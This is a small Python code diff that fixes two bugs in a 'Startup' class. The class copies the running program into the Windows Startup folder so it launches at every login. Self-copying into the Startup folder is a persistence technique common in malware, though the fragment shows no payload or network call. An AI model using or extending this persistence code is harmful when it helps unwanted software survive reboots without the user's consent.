@@ -3,7 +3,7 @@ class Startup:
         import os
         self.roaming = os.getenv("appdata")
         self.startup_loc = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        self.common_startup_loc = os.path.join("C:", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs",
+        self.common_startup_loc = os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs",
                                                "StartUp")
 
     def send_error_notification(self, exception):
@@ -28,7 +28,7 @@ class Startup:
 
     def copy_to_startup(self):
         try:
-            from os import argv
+            from sys import argv
             import shutil
             shutil.copy(argv[0], self.startup_loc)
         except Exception as e:
